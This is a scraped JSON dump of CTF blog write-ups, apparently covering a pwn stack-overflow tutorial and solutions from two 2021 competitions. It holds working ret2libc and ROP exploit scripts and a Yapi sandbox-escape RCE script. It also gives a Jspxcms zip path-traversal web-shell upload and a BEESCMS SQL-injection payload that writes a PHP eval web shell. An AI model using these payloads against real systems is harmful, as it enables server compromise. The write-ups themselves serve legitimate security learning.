&#x27;a&#x27;*(0x80+8)+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)p.sendline(pl)p.interactive() 使用LibSearcher12345678910111213141516171819202122232425262728# x64from pwn import *from LibcSearcher import *r = remote(&#x27;x.x.x.x&#x27;, 22222)elf = ELF(&#x27;./pwn&#x27;)pop_rdi_ret = 0x400c83ret = 0x4006b9puts_plt = elf.plt.putsputs_got = elf.got.putsmain_addr = elf.sym.mainpayload = &#x27;a&#x27;*0x58 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)r.sendline(payload)puts_addr = u64(r.recv(6).ljust(0x8, b&#x27;\\x00&#x27;))# 或 puts_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,&#x27;\\x00&#x27;))libc = LibcSearcher(&#x27;puts&#x27;, puts_addr)libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)print(libcbase)sys_addr = libcbase + libc.dump(&#x27;system&#x27;)bin_sh = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)payload = &#x27;a&#x27;*0x58 + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh) + p64(sys_addr)r.sendline(payload)r.interactive() one_gadget查找已知的libc中 exevce(&quot;/bin/sh&quot;) 语句的地址： one_gadget libc.so 123456789101112131415161718192021222324252627# x64from pwn import *r = remote(&#x27;x.x.x.x&#x27;, 22222)elf = ELF(&#x27;./pwn&#x27;)libc = ELF(&#x27;./libc.so&#x27;)pop_rdi_ret = 0x400c83ret = 0x4006b9puts_plt = elf.plt.putsputs_got = elf.got.putsmain_addr = elf.sym.mainpayload = &#x27;a&#x27;*0x58 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)r.sendline(payload)puts_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,&#x27;\\x00&#x27;))print(hex(puts_addr))libc_base = puts_addr - libc.sym.puts#one_gadget libc.soexecve_addr = libc_base + 0x10a38cpayload = &#x27;a&#x27;*0x58 + p64(execve_addr)r.sendline(payload)r.interactive() ​ ret2csu（预留） ​ ret2dl_resolve（预留） ​ 其他姿势栈迁移在一般的栈溢出攻击时，有一个前提条件是“有充分的栈空间用来布局”，通常我们会在栈的剩余空间上存放一些恶意指令。但是当栈的剩余空间很小时，例如只可覆盖ebp和ret，一般的栈溢出思路就无法完成攻击。 不过既然栈上没有足够的空间供我们布置，那我们可以尝试找另一块空间来进行布局，然后将栈指针esp劫持到这里就能完成攻击，这就是”栈迁移“的基本思想。 如图所示，当主调函数调用func函数时： 执行push eip+4将调用语句的下一条语句保存到栈上，用来在函数返回时跳转到返回地址（ret） PC指向func函数的地址 在执行func函数前： func会先将ebp寄存器中的值保存到栈上，用于在函数返回时还原ebp为主调函数的栈底。 函数执行完毕，返回，会执行leave ret这两条语句 leave相当于mov esp,ebp（把栈指针指向栈底，销毁栈帧）、pop ebp（还原ebp为主调函数的栈底）。 ret相当于pop eip（把栈上保存的返回地址存入eip寄存器） 从这里可以知道，ebp的值可以控制esp，但是leave指令是先mov esp,ebp后pop ebp，看上去没有办法通过修改栈上保存的ebp改变esp的值，不过不要忘记我们还可以控制ret的值，如果把ret覆盖为leave ret的地址，我们覆盖的假ebp就可以通过两次leave语句到esp寄存器上，从而完成了栈迁移。 思路： 利用第一次输入泄露出ebp地址，再利用第二次输入构造一个栈，将esp劫持到我们构造的栈上，再把栈上的返回地址改为system函数的地址，这样就模拟出了一次system(&quot;/bin/sh&quot;)的调用。 参考： ciscn_2019_es_2 ​ 特殊系统调用mprotect将内存页的权限修改为可读可写可执行。 需要注意的是指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。 12345678910111213141516171819#include &lt;sys/mman.h&gt;int mprotect(void *addr, size_t len, int prot);/*addr：修改保护属性区域的起始地址，addr必须是一个内存页的起始地址，简而言之为页大小（一般是 4KB == 4096字节）整数倍。len：被修改保护属性区域的长度,最好为页大小整数倍。修改区域范围[addr, addr+len-1]。prot：可以取以下几个值，并可以用“|”将几个属性结合起来使用：1）PROT_READ：内存段可读；2）PROT_WRITE：内存段可写；3）PROT_EXEC：内存段可执行；4）PROT_NONE：内存段不可访问。返回值：0；成功，-1；失败（并且errno被设置）1）EACCES：无法设置内存段的保护属性。当通过 mmap(2) 映射一个文件为只读权限时，接着使用 mprotect() 标志为 PROT_WRITE这种情况就会发生。2）EINVAL：addr不是有效指针，或者不是系统页大小的倍数。3）ENOMEM：内核内部的结构体无法分配。这里的参数prot： r:4 w:2 x:1prot为7（1+2+4）就是rwx可读可写可执行，与linux文件属性用法类似。 */ getdents64读取目录结构。 int getdents(unsigned int fd, struct linux_dirent *dirp,unsigned int count); 该函数是一个解析文件夹的函数，第一个参数时要解析的文件句柄，第二个参数是存放解析数据的位置，count是dirp的大小，通过这个我们就可以解析文件夹，需要注意的是当打开文件夹时open的第二个参数为0x10000,打开文件时的参数为0。 返回结构体： 1234567struct linux_dirent64 &#123; ino64_t d_ino; /* 64-bit inode number */ off64_t d_off; /* 64-bit offset to next structure */ unsigned short d_reclen; /* Size of this dirent */ unsigned char d_type; /* File type */ char d_name[]; /* Filename (null-terminated) */&#125;; ​ orworw 方式，即 open-read-write，通过文件操作直接获取文件内容。 查找 syscall; ret 的 gadget方法 用 opcode 功能搜 123from pwn import *print(asm(&#x27;syscall;ret&#x27;).encode(&#x27;hex&#x27;))# 0f05c3 ROPgadget搜索 ROPgadget --binary libc-2.31.so --opcode 0f05c3 open 1234567891011# open(&quot;.&quot;)payload += p64(pop_rax_ret)payload += p64(2)payload += p64(pop_rdi_ret)payload += p64(bss_addr)payload += p64(pop_rsi_ret)payload += p64(0)payload += p64(pop_rdx_r12_ret)payload += p64(0)payload += p64(0)payload += p64(syscall_ret) read 123456789# read(0, bss_addr, 2)payload += p64(pop_rdi_ret)payload += p64(0)payload += p64(pop_rsi_ret)payload += p64(bss_addr)payload += p64(pop_rdx_r12_ret)payload += p64(2)payload += p64(0)payload += p64(elf.sym[&#x27;read&#x27;]) write 1234567891011# write(1, bss_addr + 0x200, 0x600)payload += p64(pop_rax_ret)payload += p64(1)payload += p64(pop_rdi_ret)payload += p64(1)payload += p64(pop_rsi_ret)payload += p64(bss_addr + 0x200)payload += p64(pop_rdx_r12_ret)payload += p64(0x600)payload += p64(0)payload += p64(syscall_ret) ​ 保护ALSRASLR 的是操作系统的功能选项，作用于 executable（ELF）装入内存运行时，因而只能随机化 stack、heap、libraries 的基址。 ​ NXNo-Execute（不可执行），Nx 的原理是将数据所在内存页标识为不可执行，当程序执行流被劫持到栈上时，程序会尝试在数据页面上执行指令，因为数据页被标记为不可知性，此时CPU就会抛出异常，而不是去执行栈上数据。 ​ canary金丝雀保护，是一种用来防护栈溢出的保护机制。其原理是在函数入口处，先从 fs/gs 寄存器中取出一个 4(eax)/8(rax) 字节的 cookie 信息存到栈上，当函数结束返回的时候会验证 cookie 信息是否合法(与开始存的是否一致)，如果不合法就停止程序运行。真正的 cookie 信息也会保存在程序的某个位置。插入栈中的 cookie 一般在 ebp / rbp 之上的一个内存单元保存。 攻击 Stack smash（待补充） TLS 线程局部存储 (TLS) 是一种存储持续期（storage duration），对象的存储是在线程开始时分配，线程结束时回收，每个线程有该对象自己的实例。 TLS 具有 TCB 结构体。也就是说对于 TLS 的变量，每个线程都会有自己独有的一份，既然维护 canary 的 TCB 结构体是 TLS 的，就不能想到这个结构体必然会在线程自己申请的空间里面，并且在作比较时也是和自己独有的那一份比较的。TCB 结构体是是以 fs 作为基址索引的，TCB 结构体的定义： 12345678910111213141516171819202122232425262728typedef struct&#123; void *tcb; /* Pointer to the TCB. Not necessarily the thread descriptor used by libpthread. */ dtv_t *dtv; void *self; /* Pointer to the thread descriptor. */ int multiple_threads; int gscope_flag; uintptr_t sysinfo; uintptr_t stack_guard; uintptr_t pointer_guard; unsigned long int vgetcpu_cache[2]; /* Bit 0: X86_FEATURE_1_IBT. Bit 1: X86_FEATURE_1_SHSTK. */ unsigned int feature_1; int __glibc_unused1; /* Reservation of some values for the TM ABI. */ void *__private_tm[4]; /* GCC split stack support. */ void *__private_ss; /* The lowest address of shadow stack, */ unsigned long long int ssp_base; /* Must be kept even if it is no longer used by glibc since programs, like AddressSanitizer, depend on the size of tcbhead_t. */ __128bits __glibc_unused2[8][4] __attribute__ ((aligned (32))); void *__padding[8];&#125; tcbhead_t; 在 gdb 里面看 fs 附近的内存分布情况，使用 fsbase 查看 fs 的值，内存分布和结构体定义一致，所以 fs 就是指向 TCB 结构体，vmmap 一下会发现 TCB 是存在栈上的，而且显然建立的时间在 test_thread 之前，又由于可以栈溢出接近 0x1000 个字节，完全可以覆写 TCB 结构体，把 TCB 的 stack_guard 字段写成比如 p64(0)，那么溢出到 canary 的时候覆写成 0 就可以 bypass canary。 ​ PIEPIE（Position Independent Executables）是编译器（gcc，…）功能选项（-fPIE / -fpie），作用于编译过程，可将其理解为特殊的 PIC（so专用，Position Independent Code），加了 PIE 选项编译出来的 ELF 用 file 命令查看会显示其为 so，其随机化了 ELF 装载内存的基址（代码段、plt、got、data 等共同的基址）。其效果为用 objdump、IDA 反汇编之后的地址是用偏移表示的而不是绝对地址。 ​ SROP（预留） ​ BROP（预留） ​ 其他随机数（srand+rand）glibc随机数发生器","categories":[{"name":"pwn","slug":"pwn","permalink":"https://lazzzaro.github.io/categories/pwn/"}],"tags":[{"name":"栈","slug":"栈","permalink":"https://lazzzaro.github.io/tags/%E6%A0%88/"}],"author":"Lazzaro"},{"title":"2021DASCTF July X CBCTF 4th","slug":"match-2021DASCTF-July-X-CBCTF-4th","date":"2021-08-01T10:13:02.000Z","updated":"2021-08-02T15:57:40.821Z","comments":true,"path":"2021/08/01/match-2021DASCTF-July-X-CBCTF-4th/","link":"","permalink":"https://lazzzaro.github.io/2021/08/01/match-2021DASCTF-July-X-CBCTF-4th/","excerpt":"","text":"​ 2021 DASCTF实战精英夏令营预热赛DASCTF July x CBCTF 4th主办单位: 安恒信息、杭州电子科技大学网络空间安全学院竞赛时间: 2021年7月31日10:00- 2021年8月1日18:00报名时间: 2021年7月15日10:00-2021年7月31日10:00报名地址: https://buuoj.cn/das报名方式: 登录后点击[个人信息]完善个人信息&gt;点击[参与情况]创建战队-&gt;分享战队Token给自己的队员-&gt;等待比赛开始竞赛方式: 团队赛(最多三人一组)命题战队: 0rays Rank: 42 CRYPTOYusa的密码学签到——BlockTrick 好久不见，上课前先签个到叭！此题 nc 连接。 123456789101112131415161718192021222324252627from Crypto.Cipher import AESimport osdef pad(a): size = (16-len(a)%16)%16 a += chr(size)*size return aiv = os.urandom(16)key = os.urandom(16)enc = AES.new(key,AES.MODE_CBC,iv)print(iv.encode(&#x27;hex&#x27;))for _ in range(2): try: trick = raw_input(&quot;&quot;) trick = pad(trick.decode(&#x27;hex&#x27;)) cipher = enc.encrypt(trick) if trick == cipher and trick != &quot;&quot; : with open(&quot;flag.txt&quot;) as f: print(f.read()) exit() else: print(cipher.encode(&#x27;hex&#x27;)) print(&quot;Try again&quot;) except: exit() AES-CBC模式原理。 第一次： 令 P0 = IV C0 = Encrypt(P0 XOR IV) = Encrypt(0) 第二次： 令 P1 = C0 C1 = Encrypt(P1 XOR C0) = Encrypt(C0 XOR C0) = Encrypt(0) = C0 = P1 ​ MISCred_vs_blue 红队和蓝队将开展66轮对抗，你能预测出每轮对抗的结果吗？ nc连接 同一次连接内，错误可以反复从头猜，66次随机结果不变，存储之前猜对的正确结果，错误时再重猜当前次数的另一种结果即可。 123456789101112131415161718192021222324252627282930313233from pwn import *r=remote(&#x27;node4.buuoj.cn&#x27;,29203)r.recvline()r.recvline()r.recvline()ans=[&#x27;?&#x27;]*67i=1while i&lt;=66: print(r.recvline()) r.recvline() if ans[i]==&#x27;?&#x27;: r.sendline(&#x27;r&#x27;) r.recvline() r.recvline() x=r.recvline() if &#x27;success&#x27; in x: ans[i]=&#x27;r&#x27; i+=1 elif &#x27;Sorry&#x27; in x: ans[i]=&#x27;b&#x27; r.sendlineafter(&#x27;Play again? (y/n): &#x27;,&#x27;y&#x27;) i=1 else: r.sendline(ans[i]) r.recvline() r.recvline() r.recvline() i+=1 print(ans)print(r.recvall()) ​ funny_maze 七月被困在了迷宫里，十秒后迷宫的终点就要永远消失了，你能帮她走出迷宫吗？ nc 连接 DFS算法走迷宫。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475from pwn import *p=remote(&#x27;node4.buuoj.cn&#x27;,27139)def get_sol(maze): if len(path) &gt; 0: print(&#x27;\\n&#x27;.join(&#x27;&#x27;.join(row) for row in maze)) solution = &#x27;&#x27;.join(path)[::-1] print(solution) global path path = [] return solutiondef dfs(maze, y, x): if maze[y][x] in (&#x27; &#x27;,&#x27;S&#x27;): tag = &#x27;o&#x27; maze[y][x] = tag if dfs(maze, y, x+1) == True: tag = &#x27;R&#x27; path.append(tag) elif dfs(maze, y+1, x) == True: tag = &#x27;D&#x27; path.append(tag) elif dfs(maze, y, x-1) == True: tag = &#x27;L&#x27; path.append(tag) elif dfs(maze, y-1, x) == True: tag = &#x27;U&#x27; path.append(tag) else: tag = &#x27; &#x27; maze[y][x] = tag return (tag != &#x27; &#x27;) elif maze[y][x] == &#x27;E&#x27;: return True return Falsefor i in range(5): p.recvline()p.sendline(&#x27;1&#x27;)while 1: maze = [] first = p.recvline().strip() if &#x27;#&#x27; not in first: print(first) print(p.recvall()) break leng = len(first) maze.append(list(first)) for i in range(leng-1): now = p.recvline().strip() maze.append(list(now)) start = [] for y in range(0,len(maze)): for x in range(0,len(maze[y])): if maze[y][x] == &#x27;S&#x27;: start = [y,x] path = [] dfs(maze, start[0], start[1]) sol = get_sol(maze) print(sol) p.recvline() p.sendline(str(len(sol)+1)) p.recvline() p.recvline() p.recvline() ​ ezSteganography 有手就行的隐写 10M+ png图。 zsteg在G通道发现隐写另一png图，文字只有一半flag： 查找QIM算法： 量化索引调制算法(QIM)是一种经典的水印算法，它根据水印信息，把原始载体数据用量化器量化到不同的索引区间，能在获取较高的鲁棒性同时，具有较小嵌入失真。QIM算法能有效抵抗滤波、噪声、剪切等常见攻击。 找到具体实现代码，将输入从一维修改为二维图像矩阵： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103&quot;&quot;&quot;Implementation of QIM method from Data Hiding Codes, Moulin and Koetter, 2005&quot;&quot;&quot;from __future__ import print_functionimport sysimport osHOME = os.environ[&quot;HOME&quot;]import numpy as npclass QIM: def __init__(self, delta): self.delta = delta def embed(self, x, m): &quot;&quot;&quot; x is a vector of values to be quantized individually m is a binary vector of bits to be embeded returns: a quantized vector y &quot;&quot;&quot; x = x.astype(float) d = self.delta y = np.round(x/d) * d + (-1)**(m+1) * d/4. return y def detect(self, z): &quot;&quot;&quot; z is the received vector, potentially modified returns: a detected vector z_detected and a detected message m_detected &quot;&quot;&quot; shape = z.shape z = z.flatten() m_detected = np.zeros_like(z, dtype=float) z_detected = np.zeros_like(z, dtype=float) z0 = self.embed(z, 0) z1 = self.embed(z, 1) d0 = np.abs(z - z0) d1 = np.abs(z - z1) gen = zip(range(len(z_detected)), d0, d1) for i, dd0, dd1 in gen: if dd0 &lt; dd1: m_detected[i] = 0 z_detected[i] = z0[i] else: m_detected[i] = 1 z_detected[i] = z1[i] z_detected = z_detected.reshape(shape) m_detected = m_detected.reshape(shape) return z_detected, m_detected.astype(int) def random_msg(self, l): &quot;&quot;&quot; returns: a random binary sequence of length l &quot;&quot;&quot; return np.random.choice((0, 1), l)def test_qim(): &quot;&quot;&quot; tests the embed and detect methods of class QIM &quot;&quot;&quot; #l = 10000 # binary message length delta = 20 # quantization step qim = QIM(delta) #x = np.random.randint(0, 255, l).astype(float) # host sample #msg = qim.random_msg(l) #y = qim.embed(x, msg) from PIL import Image img = Image.open(&#x27;ezSteganography-flag.png&#x27;) y = np.array(img) z_detected, msg_detected = qim.detect(y) new_img = Image.fromarray(np.uint8(255*msg_detected)) new_img.save(&#x27;part2.png&#x27;) #print(x) #print(msg) print(y) print(z_detected) #print(msg) print(msg_detected) #assert np.allclose(msg, msg_detected) # compare the original and detected messages #assert np.allclose(y, z_detected) # compare the original and detected vectorsdef main(): test_qim()if __name__ == &quot;__main__&quot;: sys.exit(main()) 得到隐写png水印图片： ​ WEBezrce 你真的会 nodejs 吗？ Yapi远程命令执行漏洞。 注册并登录账号，添加项目，选择设置，设置全局mock脚本： 123456const sandbox = thisconst ObjectConstructor = this.constructorconst FunctionConstructor = ObjectConstructor.constructorconst myfun = FunctionConstructor(&#x27;return process&#x27;)const process = myfun()mockJson = process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString() 打开脚本，添加一个接口，访问Mock地址即可成功RCE。 ​ jspxcms http://sdejkwdfnewi3f2jr32d3edfewd.dasctf.node4.buuoj.cn:82/ 靶机每十分钟重置一次。 Jspxcms解压getshell漏洞。 参考信息登录后台/cmscp/index.do，admin/空 弱口令进入后台，在文件管理可上传文件。 虽然能上传任意文件，但在JspDispatcherFilter.java限制了对jsp文件的访问，但可上传并解压zip文件，因WebFileUploadsController.java里的unzip方法调用了下层方法却没有进行文件名检查，导致可以目录穿透。 将大马cmd.war打包上传并解压，默认放在\\webapps\\ROOT\\uploads\\1\\下，再修改文件名为../../../cmd.war即可将cmd.war置于webapps根目录下，可自动解析。 访问/cmd查看根目录flag。 ​ cybercms 赛博CMS，只为安全而生 Hint: 信息搜集是一个web手必备的技能 下载源码www.zip，在/admin/version.php中发现此为BEESCMS v4.0改的CMS。 找到后台登录页面存在Beescms_v4.0 SQL注入漏洞，不同在于过滤函数除了fl_value和fl_html，还多了个f1_vvv： 1234567891011121314151617function fl_value($str)&#123; if(empty($str))&#123;return;&#125; return preg_replace(&#x27;/select|insert | update | and | in | on | left | joins | delete |\\%|\\=|\\.\\.\\/|\\.\\/| union | from | where | group | into |load_file|outfile/i&#x27;,&#x27;&#x27;,$str);&#125;define(&#x27;INC_BEES&#x27;,&#x27;B&#x27;.&#x27;EE&#x27;.&#x27;SCMS&#x27;);function fl_html($str)&#123; return htmlspecialchars($str);&#125;function f1_vvv($str)&#123; if(empty($str))&#123;return;&#125; if(preg_match(&quot;/\\ /i&quot;, $str))&#123; exit(&#x27;Go away,bad hacker!!&#x27;); &#125; preg_replace(&#x27;/0x/i&#x27;,&#x27;&#x27;,$str); return $str;&#125; fl_value过滤关键字，可双写绕过； f1_html中htmlspecialchars只对双引号编码，可用单引号绕过； f1_vvv中过滤空格和0x，空格可注释绕过，0x双写绕过。 payload: user=-1&#39;/**/uni union on/**/selselectect/**/00xx3c3f70687020406576616c28245f504f53545b636d645d293b3f3e,2,3,4,5/**/int into o/**/outoutfilefile/**/&#39;/var/www/html/2.php&#39;%23&amp;password=ss&amp;code=&amp;submit=true&amp;submit.x=46&amp;submit.y=24 写入shell，蚁剑连接，根目录找到flag。","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2021赛","slug":"2021赛","permalink":"https://lazzzaro.github.io/tags/2021%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"GKCTF x DASCTF应急挑战杯","slug":"match-GKCTFxDASCTF应急挑战杯","date":"2021-06-26T09:31:36.000Z","updated":"2021-06-29T11:50:57.838Z","comments":true,"path":"2021/06/26/match-GKCTFxDASCTF应急挑战杯/","link":"","permalink":"https://lazzzaro.github.io/2021/06/26/match-GKCTFxDASCTF%E5%BA%94%E6%80%A5%E6%8C%91%E6%88%98%E6%9D%AF/","excerpt":"","text":"​ 指导单位: 中国移动通信联合会主办单位: 防灾科技学院信息工程学院杭州安恒信息技术股份有限公司本次命题: Ginkgo战队比赛时间: 2021年6月26日09:00-17:00报名时间: 2021年6月21日19:30-6月26日9:00报名地址: buuoj.cn/das Rank: 40 CryptoRandom flag格式为 GKCTF{} 12345678910111213import randomfrom hashlib import md5def get_mask(): file = open(&quot;random.txt&quot;,&quot;w&quot;) for i in range(104): file.write(str(random.getrandbits(32))+&quot;\\n&quot;) file.write(str(random.getrandbits(64))+&quot;\\n&quot;) file.write(str(random.getrandbits(96))+&quot;\\n&quot;) file.close()get_mask()flag = md5(str(random.getrandbits(32)).encode()).hexdigest()print(flag) Python中random模块采用梅森旋转算法（MT19937）生成伪随机序列中的元素，该PRNG采用32位的state和32位的输出，在获得足够连续输出的情况下，梅森旋转算法接下来的输出值是可以准确预测的。 根据 random.txt 中104组 random.getrandbits() 函数输出值，利用预测工具 Mersenne Twister Predictor 来求出下一个随机数： 12345678910111213141516171819202122import randomfrom mt19937predictor import MT19937Predictorfrom hashlib import md5predictor = MT19937Predictor()file = open(&quot;random.txt&quot;,&quot;r&quot;).readlines()c1 = []c2 = []c3 = []for k in range(0,len(file),3): c1 += [int(file[k].strip())] c2 += [int(file[k+1].strip())] c3 += [int(file[k+2].strip())]for k in range(104): predictor.setrandbits(c1[k], 32) predictor.setrandbits(c2[k], 64) predictor.setrandbits(c3[k], 96)print(md5(str(predictor.getrandbits(32)).encode()).hexdigest())#14c71fec812b754b2061a35a4f6d8421 ​ Misc签到 师傅们玩的开心~（flag由flag头包裹 用Wireshark打开流量包文件 tmpshell.pcapng，追踪TCP流，从第3个流开始有HTTP POST数据包，都为 /g1nkgo/tmpshell.php 的RCE结果。 看到第5个流有 cat /f14g 命令结果，下载下来16进制查看，从文件头 1f8b0800000000000003 知为gzip文件，解压，逆序+base64解码得： [回车] [回车] [回车] ffllaagg{{}}WWeellcc))[删除] [删除] 00mmee__GGkkCC44FF__mm11ssiiCCCCCCCCCCCC!! 两个相同字符一组还原得flag。 ​ 问卷调查 https://www.wjx.cn/vj/Y3msOw2.aspx 感谢各位师傅参与本次比赛。 填问卷。 ​ 你知道apng吗 （flag由flag头包裹 apng图片（动态png图片），用apngdis工具提取各帧，发现第2、18、26帧有二维码。 QR_Research能识别出第18帧为 -ad20，以及第26帧为 -0327-288a235370ea&#125;，第2帧变形二维码无法识别，用在线工具qrazybox照着手绘，得到结果 flag&#123;a3c7e4e5。 flag应为uuid形式，还少一段，按照2、18、26的间隔，应该在第10帧里，stegsolve查看第10帧，在Red 2通道看到二维码，识别结果 -9b9d。 拼接得flag。 ​ 银杏岛の奇妙冒险 链接: https://pan.baidu.com/s/1cONFRAgjmu2-de67IRthhQ 密码: 04m0 链接：https://share.weiyun.com/hdikz5gL 密码：yjyh3g 游戏题 1.游戏启动需要java1.8环境，无java环境会自动帮助安装java环境，如果你已经有java1.8环境，即可无视这条信息 2.启动 “点击启动.exe” 文件，打开游戏启动器，输入你的ID 3.java环境配置完毕后，最好分配游戏内存至少为2048M 4.进入游戏后，根据游戏内的任务索引完成任务，即可获取flag 5.进入游戏 一定 一定 一定要注意对话信息，否则无法顺利的完成任务 5.祝大家玩的愉快 Minecraft游戏，试玩了下不熟悉，尝试从资源文件入手。 Everything搜索 flag 关键字，发现 .minecraft\\saves\\Where is the flag 存档目录，接着在 customnpcs\\quests\\主线 目录中找到主线对应的json文件有关键字符串： 2.json 中：&quot;&#123;\\&quot;text\\&quot;:\\&quot; part 1\\\\nw3lc0me_\\\\n\\\\npart 2\\\\n291 -95 67\\&quot;&#125;&quot;， 3.json 中：&quot;&#123;\\&quot;text\\&quot;:\\&quot; part 2\\\\nt0_9kctf_\\\\n\\\\npart 3 \\\\n324 -190 79\\&quot;&#125;&quot;， 4.json 中：&quot;&#123;\\&quot;text\\&quot;:\\&quot; part 3\\\\n2021_\\\\n\\\\npart 4\\\\n362 -144 69\\&quot;&#125;&quot;， 5.json 中：&quot;&#123;\\&quot;text\\&quot;:\\&quot; Part 4\\\\nCheck_1n\\\\n恭喜你，\\\\n完成签到，\\\\n武运昌隆。\\&quot;&#125;&quot;， 前面是内容，后面是下一处的坐标。 拼接，加头得flag。 ​ FireFox Forensics 取证大佬说这是一份登录凭证文件 得到 logins.json 和 key4.db 两个文件，结合题目知是火狐浏览器存储密码信息的密钥文件对，直接利用Firepwd工具解析（将两个文件置于脚本同一目录下）： python firepwd.py 结果： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152globalSalt: b&#x27;1e26e84b2f01da28d865e7258f9003d16b9c43f2&#x27; SEQUENCE &#123; SEQUENCE &#123; OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2 SEQUENCE &#123; SEQUENCE &#123; OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2 SEQUENCE &#123; OCTETSTRING b&#x27;66a735e17767b37d83d464126b36d4269243f9e0c99405ccd68f442798f83129&#x27; INTEGER b&#x27;01&#x27; INTEGER b&#x27;20&#x27; SEQUENCE &#123; OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256 &#125; &#125; &#125; SEQUENCE &#123; OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC OCTETSTRING b&#x27;24eb241594de7ab37ec379d9ba06&#x27; &#125; &#125; &#125; OCTETSTRING b&#x27;946322a2b2978db6601e449e1bdf7c4d&#x27; &#125;clearText b&#x27;70617373776f72642d636865636b0202&#x27;password check? True SEQUENCE &#123; SEQUENCE &#123; OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2 SEQUENCE &#123; SEQUENCE &#123; OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2 SEQUENCE &#123; OCTETSTRING b&#x27;56722302469f529a29dc73f28d6af3ed0ee483cceff05772e96e2313336816fd&#x27; INTEGER b&#x27;01&#x27; INTEGER b&#x27;20&#x27; SEQUENCE &#123; OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256 &#125; &#125; &#125; SEQUENCE &#123; OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC OCTETSTRING b&#x27;ef6a4df3e5fd7608c97df9e22092&#x27; &#125; &#125; &#125; OCTETSTRING b&#x27;51b24cd6a2672c312255d7f2dddeb67336fd56973b4302bb2eacf2270c251d41&#x27; &#125;clearText b&#x27;673dec57458fb95bd50bdc9198541038970e5b3d518973a40808080808080808&#x27;decrypting login/password pairshttps://ctf.g1nkg0.com:b&#x27;admin&#x27;,b&#x27;GKCTF&#123;9cf21dda-34be-4f6c-a629-9c4647981ad7&#125;&#x27; ​ ReverseQQQQT QQQT？什么东西？ 链接: https://pan.baidu.com/s/1e0fdBFIZ52EX04PwdgmpRQ 密码: cfiq IDA打开，在字符串窗口跟进 56fkoP8KhwCf3v7CEz 找到关键函数 sub_4012F0()： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107int __thiscall sub_4012F0(_DWORD *this)&#123; int v1; // edi _BYTE *v2; // esi const char *v3; // edx _BYTE *v4; // esi int v5; // ecx int v6; // eax int v7; // ecx int v8; // edx int v9; // edi int v10; // esi _BYTE *v11; // ecx unsigned int v12; // ecx int v14; // [esp-8h] [ebp-A8h] char v16[4]; // [esp+10h] [ebp-90h] BYREF char v17[4]; // [esp+14h] [ebp-8Ch] BYREF _BYTE *v18; // [esp+18h] [ebp-88h] const char *v19; // [esp+1Ch] [ebp-84h] int v20; // [esp+20h] [ebp-80h] int v21; // [esp+24h] [ebp-7Ch] BYREF _BYTE *v22; // [esp+28h] [ebp-78h] BYREF char v23[60]; // [esp+2Ch] [ebp-74h] BYREF __int128 v24[2]; // [esp+68h] [ebp-38h] BYREF __int64 v25; // [esp+88h] [ebp-18h] int v26; // [esp+9Ch] [ebp-4h] MEMORY[0x5FF6](*(_DWORD *)(this[6] + 4), v16); v26 = 0; MEMORY[0x7C7C](v16, v17); LOBYTE(v26) = 1; v19 = (const char *)MEMORY[0x7C48](v17); v24[0] = 0i64; v24[1] = 0i64; v25 = 0i64; strcpy(v23, &quot;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&quot;); v21 = 138 * strlen(v19) / 0x64; v14 = v21 + 1; v1 = 0; v22 = (_BYTE *)MEMORY[0x8114](v21 + 1); v2 = v22; sub_402C08(v22, 0, v14); v3 = v19; v20 = (int)(v19 + 1); if ( strlen(v19) ) &#123; v4 = &amp;v2[v21]; v18 = v4; while ( 1 ) &#123; v20 = ((char)*v4 &lt;&lt; 8) + v3[v1]; v5 = v20 / 58; *v4 = v20 % 58; if ( v5 ) &#123; do &#123; v6 = (char)*--v4; v7 = (v6 &lt;&lt; 8) + v5; v20 = v7 / 58; *v4 = v7 % 58; v5 = v20; &#125; while ( v20 ); v4 = v18; &#125; if ( ++v1 &gt;= strlen(v19) ) break; v3 = v19; &#125; v2 = v22; &#125; v8 = 0; if ( !*v2 ) &#123; do ++v8; while ( !v2[v8] ); &#125; v9 = v21; if ( v8 &lt;= v21 ) &#123; v10 = v2 - (_BYTE *)v24; do &#123; v11 = (char *)v24 + v8++; *v11 = v23[(char)v11[v10]]; &#125; while ( v8 &lt;= v9 ); &#125; if ( !MEMORY[0x7C1A](v24, &quot;56fkoP8KhwCf3v7CEz&quot;) ) &#123; if ( v19 ) v12 = strlen(v19); else v12 = -1; v22 = (_BYTE *)MEMORY[0x7CCC](v19, v12); LOBYTE(v26) = 2; v21 = MEMORY[0x7CCC](&quot;flag&quot;, 4); LOBYTE(v26) = 3; MEMORY[0x6124](this, &amp;v21, &amp;v22, 1024, 0); MEMORY[0x7C66](&amp;v21); MEMORY[0x7C66](&amp;v22); &#125; MEMORY[0x7C30](v17); return MEMORY[0x7C66]();&#125; 分析代码逻辑知将输入字符串base58编码后的结果与字符串 56fkoP8KhwCf3v7CEz 比对，直接base58解码 